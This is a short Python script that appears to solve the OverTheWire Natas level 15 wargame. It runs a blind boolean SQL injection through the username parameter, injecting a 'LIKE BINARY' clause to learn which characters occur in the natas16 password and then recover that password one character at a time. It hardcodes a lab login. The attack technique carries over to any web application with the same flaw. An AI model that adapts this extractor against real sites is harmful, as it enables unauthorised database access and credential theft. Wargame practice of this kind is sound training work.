import requests, string

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

characters = ''.join([string.ascii_letters, string.digits])

password_dictionary = []
exists_str = "This user exists"
for char in characters:
    uri = ''.join([url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"%', char, '%', '&debug'])
    r = requests.get(uri, auth=(auth_username, auth_password))
    if exists_str in r.text:
        password_dictionary.append(char)
        print("Password Dictionary: {0}".format(''.join(password_dictionary)))
print("Dictionary build complete.")
print("Dictionary: {0}".format(''.join(password_dictionary)))
print("Now attempting to brute force...")
password_list = []
password = ''
for i in range(1, 64):
    for char in password_dictionary:
        test = ''.join([password, char])
        uri = ''.join([url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"', test, '%', '&debug'])
        r = requests.get(uri, auth=(auth_username, auth_password))
        if exists_str in r.text:
            password_list.append(char)
            password = ''.join(password_list)
            print("Length: {0}, Password: {1}".format(len(password), password))
